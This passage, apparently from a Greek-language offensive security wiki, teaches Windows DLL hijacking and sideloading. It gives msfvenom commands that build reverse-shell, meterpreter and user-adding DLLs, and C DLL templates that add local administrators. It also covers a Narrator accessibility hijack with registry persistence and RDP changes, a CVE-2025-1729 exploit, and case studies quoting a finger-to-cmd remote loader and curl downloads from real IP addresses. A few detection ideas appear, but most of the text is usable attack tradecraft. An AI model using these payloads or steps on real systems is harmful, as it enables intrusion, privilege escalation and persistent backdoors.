- **`<probing privatePath="."/>`** διατηρεί την επίλυση assembly στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε προβλέψιμη επιφάνεια για sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση σε κώδικα του επιτιθέμενου κατά την αρχικοποίηση του CLR, πριν εκτελεστεί η νόμιμη λογική της εφαρμογής.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε μια εφαρμογή full-trust να φορτώσει unsigned ή αλλοιωμένα assemblies χωρίς αποτυχία επικύρωσης strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** αποτρέπει τις ανακατευθύνσεις publisher-policy σε νεότερα assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** καθιστά την επιλογή runtime πιο ντετερμινιστική.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον, επειδή το **CLR απενεργοποιεί τη δική του ορατότητα μέσω ETW** από τις ρυθμίσεις, αντί το implant να τροποποιεί την `EtwEventWrite` στη μνήμη.

Επιχειρησιακό μοτίβο που έχει παρατηρηθεί σε πρόσφατες εκστρατείες:
- Στάδιο 1: Αποθέτει τα `setup.exe`, `setup.exe.config` και τοπικά assemblies.
- Στάδιο 2: Τα αντιγράφει σε έναν πειστικό φάκελο **ενημέρωσης AppData**, μετονομάζει το host σε κάτι όπως `update.exe` και το επανεκκινεί μέσω **προγραμματισμένης εργασίας**.
- Στάδιο 3: Επαληθεύει το πλαίσιο εκτέλεσης (για παράδειγμα, ότι η αναμενόμενη γονική διεργασία είναι η `svchost.exe` από το Task Scheduler) πριν φορτώσει το τελικό RAT DLL/export.

Ιδέες για εντοπισμό:
- Υπογεγραμμένα ή κατά τα άλλα νόμιμα **εκτελέσιμα .NET** που εκτελούνται με ύποπτα παρακείμενα αρχεία **`.config`** σε τοποθεσίες εγγράψιμες από τον χρήστη.
- Αρχεία `.config` που περιέχουν **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ή **`etwEnable enabled="false"`**.
- Προγραμματισμένες εργασίες που επανεκκινούν μετονομασμένα update binaries από το **`%LOCALAPPDATA%`** ή από καταλόγους `\bin\update\` συγκεκριμένων εφαρμογών.
- Αλυσίδες γονικών/θυγατρικών διεργασιών όπου μια προγραμματισμένη εργασία εκκινεί ένα έμπιστο .NET host, το οποίο φορτώνει αμέσως assemblies μη προερχόμενα από τον κατασκευαστή από τον δικό του κατάλογο.

#### Εξαιρέσεις στη σειρά αναζήτησης DLL σύμφωνα με την τεκμηρίωση των Windows

Η τεκμηρίωση των Windows αναφέρει ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL:

- Όταν εντοπίζεται ένα **DLL με το ίδιο όνομα με κάποιο που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει τη συνήθη αναζήτηση. Αντί γι’ αυτό, ελέγχει για ανακατεύθυνση και manifest πριν επιλέξει ως προεπιλογή το DLL που βρίσκεται ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν αναζητά το DLL**.
- Αν το DLL αναγνωρίζεται ως **γνωστό DLL** για την τρέχουσα έκδοση των Windows, το σύστημα χρησιμοποιεί την έκδοσή του για το συγκεκριμένο DLL, μαζί με τυχόν εξαρτώμενα DLL, **παραλείποντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει λίστα με αυτά τα γνωστά DLL.
- Αν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση των εξαρτώμενων DLL γίνεται σαν να είχαν καθοριστεί μόνο με τα **ονόματα των modules**, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω πλήρους διαδρομής.

### Κλιμάκωση προνομίων

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που εκτελείται ή πρόκειται να εκτελεστεί με **διαφορετικά προνόμια** (οριζόντια ή πλευρική μετακίνηση) και **της λείπει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **δικαίωμα εγγραφής** σε οποιονδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση του DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου αρχείου ή ένας κατάλογος στη διαδρομή συστήματος.

Αυτές οι προϋποθέσεις δεν είναι συνήθεις από προεπιλογή: τα προνομιούχα εκτελέσιμα αρχεία συνήθως δεν έχουν ελλείπουσες εξαρτήσεις DLL, ενώ οι τυπικοί χρήστες κανονικά δεν μπορούν να γράψουν σε καταλόγους της διαδρομής αναζήτησης συστήματος. Ωστόσο, περιβάλλοντα με εσφαλμένες ρυθμίσεις μπορούν να εκθέσουν και τις δύο συνθήκες.\
Αν πληρούνται οι απαιτήσεις, ελέγξτε το έργο [UACME](https://github.com/hfiref0x/UACME). Παρότι ο κύριος στόχος του είναι η παράκαμψη UAC, περιέχει PoC για DLL hijacking σε συγκεκριμένες εκδόσεις των Windows, τα οποία συχνά μπορούν να προσαρμοστούν στον εγγράψιμο κατάλογο που εντοπίσατε.

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** ως εξής:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Μπορείτε επίσης να ελέγξετε τις εισαγωγές ενός εκτελέσιμου αρχείου και τις εξαγωγές ενός dll με:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Για έναν πλήρη οδηγό σχετικά με το πώς να **κάνετε abuse του DLL Hijacking για κλιμάκωση προνομίων** με δικαιώματα εγγραφής σε φάκελο **System Path**, δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

Το [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για τον εντοπισμό αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Αν εντοπίσετε ένα εκμεταλλεύσιμο σενάριο, ένα από τα σημαντικότερα πράγματα για την επιτυχή εκμετάλλευσή του είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που θα εισαγάγει από αυτό το εκτελέσιμο**. Σε κάθε περίπτωση, σημειώστε ότι το DLL Hijacking είναι χρήσιμο για [κλιμάκωση από επίπεδο Medium Integrity σε High **(παρακάμπτοντας το UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity σε SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα για το **πώς να δημιουργήσετε ένα έγκυρο dll** σε αυτή τη μελέτη DLL hijacking, η οποία επικεντρώνεται στο DLL hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να χρησιμεύσουν ως **πρότυπα** ή για τη δημιουργία ενός **dll με εξαγόμενες μη απαιτούμενες συναρτήσεις**.

## **Δημιουργία και μεταγλώττιση DLLs**

### **DLL Proxifying**

Βασικά, ένα **DLL proxy** είναι ένα DLL που μπορεί να **εκτελέσει τον κακόβουλο κώδικά σας κατά τη φόρτωσή του**, αλλά και να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται**, **προωθώντας όλες τις κλήσεις στην πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus), μπορείτε να **ορίσετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να χρησιμοποιήσετε ως proxy και να **δημιουργήσετε ένα proxified dll**, ή να **ορίσετε το DLL** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Λήψη rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Αποκτήστε ένα meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Δημιουργία χρήστη (x86, δεν είδα έκδοση x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Δικό σας

Σε πολλές περιπτώσεις, το DLL που μεταγλωττίζετε πρέπει να **κάνει export κάθε συνάρτηση που εισάγει η διεργασία-θύμα**. Αν λείπει κάποιο απαιτούμενο export, το δυαδικό αρχείο δεν μπορεί να το επιλύσει και το exploit αποτυγχάνει.

<details>
<summary>Πρότυπο C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Εναλλακτική DLL C με σημείο εισόδου νήματος</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Μελέτη περίπτωσης: DLL Hijack της Narrator OneCore TTS Localization (Προσβασιμότητα/ATs)

Το Windows Narrator.exe εξακολουθεί κατά την εκκίνηση να ελέγχει μια προβλέψιμη, ειδική για τη γλώσσα DLL localization, η οποία μπορεί να γίνει hijack για αυθαίρετη εκτέλεση κώδικα και persistence.<sup>[[7]](#references)</sup>

Βασικά στοιχεία
- Διαδρομή ελέγχου (τρέχουσες εκδόσεις): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Παλιότερη διαδρομή (παλαιότερες εκδόσεις): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Αν υπάρχει μια εγγράψιμη, ελεγχόμενη από τον επιτιθέμενο DLL στη διαδρομή OneCore, φορτώνεται και εκτελείται η `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Εντοπισμός με Procmon
- Φίλτρο: `Process Name is Narrator.exe` και `Operation is Load Image` ή `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης της παραπάνω διαδρομής.

Ελάχιστη DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Σιωπή OPSEC
- Ένα αφελές hijack θα προκαλέσει ομιλία/επισήμανση στοιχείων του UI. Για να παραμείνει αθόρυβο, κατά το attach απαρίθμησε τα threads του Narrator, άνοιξε το κύριο thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάνε `SuspendThread` σε αυτό· συνέχισε στο δικό σου thread. Δες το PoC για τον πλήρη κώδικα.<sup>[[8]](#references)</sup>

Ενεργοποίηση και persistence μέσω ρυθμίσεων Accessibility
- Πλαίσιο χρήστη (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει την τοποθετημένη DLL. Στην επιφάνεια εργασίας ασφαλείας (οθόνη σύνδεσης), πάτησε CTRL+WIN+ENTER για να εκκινήσεις το Narrator· η DLL σου εκτελείται ως SYSTEM στην επιφάνεια εργασίας ασφαλείας.

Εκτέλεση SYSTEM με ενεργοποίηση μέσω RDP (πλευρική μετακίνηση)
- Ενεργοποίησε το κλασικό επίπεδο ασφάλειας RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδέσου στον host μέσω RDP και, στην οθόνη σύνδεσης, πάτησε CTRL+WIN+ENTER για να εκκινήσεις το Narrator· η DLL σου εκτελείται ως SYSTEM στην επιφάνεια εργασίας ασφαλείας.
- Η εκτέλεση σταματά όταν κλείσει η συνεδρία RDP—κάνε inject/migrate αμέσως.

Φέρε τη δική σου Accessibility (BYOA)
- Μπορείς να κλωνοποιήσεις μια ενσωματωμένη καταχώριση μητρώου Accessibility Tool (AT) (π.χ. CursorIndicator), να την επεξεργαστείς ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισαγάγεις και, στη συνέχεια, να ορίσεις το `configuration` στο όνομα αυτού του AT. Έτσι, εκτελείται αυθαίρετος κώδικας μέσω του framework Accessibility.

Σημειώσεις
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`· δεν χρειάζονται exports.

## Μελέτη περίπτωσης: CVE-2025-1729 - Κλιμάκωση προνομίων με χρήση του TPQMAssistant.exe

Αυτή η περίπτωση παρουσιάζει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), με αναγνωριστικό **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Λεπτομέρειες ευπάθειας

- **Στοιχείο**: Το `TPQMAssistant.exe`, που βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Προγραμματισμένη εργασία**: Η `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 π.μ. στο πλαίσιο του λογαριασμού του συνδεδεμένου χρήστη.
- **Δικαιώματα καταλόγου**: Εγγράψιμος από το `CREATOR OWNER`, επιτρέποντας σε τοπικούς χρήστες να τοποθετούν αυθαίρετα αρχεία.
- **Συμπεριφορά αναζήτησης DLL**: Επιχειρεί πρώτα να φορτώσει το `hostfxr.dll` από τον κατάλογο εργασίας του και καταγράφει "NAME NOT FOUND" αν λείπει, κάτι που υποδεικνύει ότι προηγείται η αναζήτηση στον τοπικό κατάλογο.

### Υλοποίηση exploit

Ένας εισβολέας μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο και να εκμεταλλευτεί την DLL που λείπει, ώστε να επιτύχει εκτέλεση κώδικα στο πλαίσιο του χρήστη:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Ροή επίθεσης

1. Ως τυπικός χρήστης, τοποθετήστε το `hostfxr.dll` στον φάκελο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Αν είναι συνδεδεμένος ένας διαχειριστής όταν εκτελεστεί η εργασία, το κακόβουλο DLL εκτελείται στη συνεδρία του διαχειριστή με medium integrity.
4. Συνδυάστε τυπικές τεχνικές UAC bypass για να αποκτήσετε δικαιώματα SYSTEM από medium integrity.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading μέσω υπογεγραμμένου host (wsc_proxy.exe)

Οι φορείς απειλών συχνά συνδυάζουν droppers βασισμένα σε MSI με DLL side-loading, ώστε να εκτελούν payloads μέσω μιας έμπιστης, υπογεγραμμένης διεργασίας.<sup>[[10]](#references)</sup>

Επισκόπηση αλυσίδας
- Ο χρήστης κατεβάζει ένα MSI. Ένα CustomAction εκτελείται σιωπηλά κατά την εγκατάσταση μέσω GUI (π.χ. μια ενέργεια LaunchApplication ή VBScript) και ανακατασκευάζει το επόμενο στάδιο από ενσωματωμένους πόρους.
- Το dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο φάκελο (ενδεικτικό ζεύγος: το υπογεγραμμένο από την Avast wsc_proxy.exe + το wsc.dll που ελέγχεται από τον εισβολέα).
- Κατά την εκκίνηση του υπογεγραμμένου EXE, η σειρά αναζήτησης DLL των Windows φορτώνει πρώτα το wsc.dll από τον τρέχοντα φάκελο εργασίας, εκτελώντας κώδικα του εισβολέα υπό μια υπογεγραμμένη γονική διεργασία (ATT&CK T1574.001).

Ανάλυση MSI (τι να αναζητήσετε)
- Πίνακας CustomAction:
  - Αναζητήστε καταχωρίσεις που εκτελούν εκτελέσιμα αρχεία ή VBScript. Ενδεικτικό ύποπτο μοτίβο: το LaunchApplication εκτελεί ένα ενσωματωμένο αρχείο στο παρασκήνιο.
  - Στο Orca (Microsoft Orca.exe), ελέγξτε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Ενσωματωμένα/διαχωρισμένα payloads στο CAB του MSI:
  - Εξαγωγή για διαχειριστές: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ή χρησιμοποιήστε το lessmsi: lessmsi x package.msi C:\out
  - Αναζητήστε πολλά μικρά τμήματα που συνενώνονται και αποκρυπτογραφούνται από ένα VBScript CustomAction. Συνήθης ροή:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Πρακτικό sideloading με το wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
  - wsc_proxy.exe: νόμιμο, υπογεγραμμένο host (Avast). Η διεργασία επιχειρεί να φορτώσει το wsc.dll από το όνομά του, μέσα από τον φάκελό της.
  - wsc.dll: DLL του attacker. Αν δεν απαιτούνται συγκεκριμένα exports, αρκεί το DllMain· διαφορετικά, δημιουργήστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στην αυθεντική βιβλιοθήκη, ενώ εκτελείτε το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Για απαιτήσεις εξαγωγών, χρησιμοποιήστε ένα proxying framework (π.χ. DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που εκτελεί επίσης το payload.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί απόλυτες διαδρομές ή safe loading flags (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, SxS και τα forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του συνόλου exports.

## Υπογεγραμμένες τριάδες + κρυπτογραφημένα payloads (μελέτη περίπτωσης ShadowPad)

Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **τριάδα τριών αρχείων**, ώστε να μοιάζει με νόμιμο λογισμικό, διατηρώντας παράλληλα το βασικό payload κρυπτογραφημένο στον δίσκο:<sup>[[12]](#references)</sup>

1. **Υπογεγραμμένο host EXE** – γίνεται κατάχρηση προμηθευτών όπως οι AMD, Realtek ή NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο ώστε να μοιάζει με αρχείο Windows (για παράδειγμα, `conhost.exe`), αλλά η υπογραφή Authenticode παραμένει έγκυρη.
2. **Κακόβουλο loader DLL** – τοποθετείται δίπλα στο EXE με το αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως ένα MFC binary που έχει obfuscated με το framework ScatterBrain· μοναδικός σκοπός του είναι να εντοπίσει το κρυπτογραφημένο blob, να το αποκρυπτογραφήσει και να κάνει reflective map το ShadowPad.
3. **Κρυπτογραφημένο payload blob** – συχνά αποθηκεύεται ως `<name>.tmp` στον ίδιο κατάλογο. Αφού κάνει memory-map το αποκρυπτογραφημένο payload, ο loader διαγράφει το αρχείο TMP για να καταστρέψει τα forensic στοιχεία.

Σημειώσεις tradecraft:

* Η μετονομασία του υπογεγραμμένου EXE (ενώ διατηρείται το αρχικό `OriginalFileName` στην κεφαλίδα PE) του επιτρέπει να μεταμφιέζεται σε αρχείο Windows, διατηρώντας παράλληλα την υπογραφή του προμηθευτή. Έτσι, αναπαράγετε τη συνήθεια του Ink Dragon να τοποθετεί binary που μοιάζουν με `conhost.exe`, αλλά στην πραγματικότητα είναι βοηθητικά προγράμματα AMD/NVIDIA.
* Επειδή το εκτελέσιμο παραμένει έμπιστο, τα περισσότερα allowlisting controls απαιτούν μόνο να βρίσκεται το κακόβουλο DLL δίπλα του. Εστιάστε στην προσαρμογή του loader DLL· το υπογεγραμμένο parent μπορεί συνήθως να εκτελεστεί χωρίς τροποποίηση.
* Ο decryptor του ShadowPad αναμένει το TMP blob δίπλα στον loader και να είναι εγγράψιμο, ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Διατηρήστε τον κατάλογο εγγράψιμο μέχρι να φορτωθεί το payload· μόλις βρεθεί στη μνήμη, το TMP αρχείο μπορεί να διαγραφεί με ασφάλεια για OPSEC.

### Αλυσίδα LOLBAS stager + sideloading staged archive (finger → tar/curl → WMI)

Οι operators συνδυάζουν DLL sideloading με LOLBAS, ώστε το μοναδικό custom artifact στον δίσκο να είναι το κακόβουλο DLL δίπλα στο έμπιστο EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Το κρυφό PowerShell εκκινεί το `cmd.exe /c`, λαμβάνει εντολές από έναν Finger server και τις διοχετεύει στο `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - Το `finger user@host` λαμβάνει κείμενο μέσω TCP/79· το `| cmd` εκτελεί την απόκριση του server, επιτρέποντας στους operators να αλλάζουν το second stage από την πλευρά του server.

- **Ενσωματωμένη λήψη/αποσυμπίεση:** Κατεβάστε ένα archive με αβλαβή επέκταση, αποσυμπιέστε το και τοποθετήστε το sideload target και το DLL σε έναν τυχαίο φάκελο `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - Το `curl -s -L` αποκρύπτει την πρόοδο και ακολουθεί τις ανακατευθύνσεις· το `tar -xf` χρησιμοποιεί το ενσωματωμένο στα Windows tar.

- **Εκκίνηση μέσω WMI/CIM:** Εκκινήστε το EXE μέσω WMI, ώστε τα δεδομένα τηλεμετρίας να δείχνουν μια διεργασία που δημιουργήθηκε μέσω CIM, ενώ αυτή φορτώνει το DLL που βρίσκεται στον ίδιο φάκελο:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Λειτουργεί με binaries που προτιμούν τοπικά DLLs (π.χ. `intelbq.exe`, `nearby_share.exe`)· το payload (π.χ. Remcos) εκτελείται με έμπιστο όνομα.

- **Αναζήτηση:** Δημιουργήστε alert για το `forfiles` όταν εμφανίζονται μαζί τα `/p`, `/m` και `/c`· ο συνδυασμός είναι ασυνήθιστος εκτός από admin scripts.


## Μελέτη περίπτωσης: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη εισβολή της Lotus Blossom καταχράστηκε μια έμπιστη αλυσίδα ενημερώσεων για να παραδώσει ένα NSIS-packed dropper, το οποίο εγκαθιστούσε ένα DLL sideload και payloads που εκτελούνταν εξ ολοκλήρου στη μνήμη.<sup>[[13]](#references)</sup>

Ροή ενεργειών
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το επισημαίνει ως **HIDDEN**, αποθηκεύει ένα μετονομασμένο Bitdefender Submission Wizard `BluetoothService.exe`, ένα κακόβουλο `log.dll` και ένα κρυπτογραφημένο blob `BluetoothService` και, στη συνέχεια, εκκινεί το EXE.
- Το host EXE εισάγει το `log.dll` και καλεί τα `LogInit`/`LogWrite`. Το `LogInit` φορτώνει το blob μέσω mmap· το `LogWrite` το αποκρυπτογραφεί με ένα custom stream βασισμένο σε LCG (σταθερές **0x19660D** / **0x3C6EF35F**, υλικό κλειδιού που προέρχεται από προηγούμενο hash), αντικαθιστά το περιεχόμενο του buffer με plaintext shellcode, αποδεσμεύει τα προσωρινά δεδομένα και μεταβαίνει σε αυτό.
- Για να αποφύγει το IAT, ο loader επιλύει τα APIs κάνοντας hash τα ονόματα των exports με **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, και έπειτα εφαρμόζοντας ένα Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνοντας τα αποτελέσματα με salted target hashes.

Κύριο shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα κύριο module τύπου PE, επαναλαμβάνοντας πράξεις add/XOR/sub με κλειδί `gQ2JR&9;` σε πέντε περάσματα, και έπειτα φορτώνει δυναμικά το `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την επίλυση των imports.
- Ανακατασκευάζει ονόματα DLL κατά την εκτέλεση μέσω bit-rotate/XOR transforms ανά χαρακτήρα και, στη συνέχεια, φορτώνει τα `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί δεύτερο resolver που διατρέχει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε blocks των 4 byte με Murmur-style mixing και καταφεύγει στο `GetProcAddress` μόνο αν δεν βρεθεί το hash.

Ενσωματωμένη διαμόρφωση & C2
- Η διαμόρφωση βρίσκεται μέσα στο αρχείο `BluetoothService` που αποθηκεύτηκε, στο **offset 0x30808** (μέγεθος **0x980**), και αποκρυπτογραφείται με RC4 και κλειδί `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
